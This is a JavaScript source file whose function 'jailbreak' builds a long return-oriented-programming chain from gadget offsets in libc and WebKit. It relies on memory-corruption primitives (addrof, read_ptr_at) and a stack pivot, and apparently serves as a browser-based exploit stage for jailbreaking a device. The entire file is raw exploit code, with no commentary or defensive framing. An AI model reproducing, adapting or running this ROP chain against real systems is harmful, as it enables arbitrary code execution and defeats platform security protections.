function jailbreak(){
var ropchain_array = new Uint32Array(99948);
var ropchain = read_ptr_at(addrof(ropchain_array)+0x10);
var ropchain_offset = 2;
function set_gadget(val)
{
    ropchain_array[ropchain_offset++] = val | 0;
    ropchain_array[ropchain_offset++] = (val / 4294967296) | 0;
}
function set_gadgets(l)
{
    for(var i = 0; i < l.length; i++)
        set_gadget(l[i]);
}
function db(data)
{
    for(var i = 0; i < data.length; i++)
        ropchain_array[ropchain_offset++] = data[i];
}
var main_ret = malloc(8);
var printf_buf = malloc(65536);
var __swbuf_addr = 0; 
ropchain_offset = 2;
set_gadgets([
libc_base+788575, 
ropchain+65720, 
webkit_base+14461559, 
libc_base+206806, 
ropchain+65680, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
ropchain+112, 
libc_base+471355, 
libc_base+811575, 
ropchain+315280, 
libc_base+811575, 
ropchain+65680 
]);
var printf_buf_offset = 128;
ropchain_offset = 32;
set_gadget(printf_buf);
db([4294967295, 4294967295]); 
ropchain_offset += 16384;
set_gadgets([
libc_base+882884, 
libc_base+793877, 
main_ret,
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
pivot_addr,
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+65800, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+65912, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+65928, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(webkit_base+432898,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+66016, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+66032, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+270800, 
libc_base+793877, 
ropchain+66192, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+66160, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+66144, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([16, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+66248, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+66352, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+66384, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+66368, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+66544, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+66512, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+66496, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([48, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+66648, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+66632, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([8, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877546, 
libc_base+793877, 
ropchain+66856, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+66824, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([48, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+66960, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+66944, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+67056, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+67144, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+67160, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+270800, 
libc_base+793877, 
ropchain+67320, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+67288, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+67272, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([16, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+67376, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+67480, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+67512, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+67496, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+67672, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+67640, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+67624, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([48, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+67776, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+67760, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([8, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+67976, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+67944, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([32, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+68080, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+68064, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877568, 
libc_base+793877, 
ropchain+68192, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+68160, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([48, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+68256, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+68312, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+75236, 
libc_base+793877, 
ropchain+68456, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+68472, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+68440, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+68592, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+68608, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+68576, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+68704, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+68720, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+68832, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+68816, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+68920, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+68904, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+69016, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+69032, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+69144, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+69128, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+69216, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+69328, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+69344, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(webkit_base+432898,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+69432, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+69448, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+69600, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+69632, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+69584, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+69616, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+69728, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+69712, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([24, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+69928, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+69896, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([32, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+70032, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+70016, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877568, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+70136, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+70224, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+70240, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+70392, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+70424, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+70376, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+70408, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+70520, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+70504, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+792472 
]);
db([16711680, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+70632, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+5202439, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([8, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+70864, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+70832, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([32, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+70968, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+70952, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877568, 
libc_base+793877, 
ropchain+71024, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+71080, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+75236, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+71208, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+71296, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+71312, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+71464, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+71496, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+71448, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+71480, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+71592, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+71576, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+792472 
]);
db([65280, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+71704, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+5202439, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([8, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877546, 
libc_base+793877, 
ropchain+71888, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+71944, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+75236, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+72072, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+72160, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+72176, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+72328, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+72360, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+72312, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+72344, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+72456, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+72440, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([24, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877546, 
libc_base+793877, 
ropchain+72608, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+72664, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+75236, 
libc_base+793877, 
ropchain+72800, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+72768, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([32, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+72928, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+72944, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+72912, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+73040, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+73056, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+73168, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+73152, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+73256, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+73240, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+73352, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+73368, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+73480, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+73464, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+73552, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+73616, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+73712, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+73784, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967284, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+73904, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+793877, 
ropchain+73960, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+74024, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967284, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+74112, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+74128, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+74280, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+74312, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+74264, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+74296, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+74384, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+74400, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+74496, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+74480, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+74576, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([4, 0]); 
set_gadget(libc_base+788575,); 
db([4, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+74728, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+74744, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+74712, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
webkit_base+48555, 
libc_base+269973, 
libc_base+793877, 
ropchain+74912, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+74928, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+74896, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+75032, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+75080, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+75064, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+75192, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+75184, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
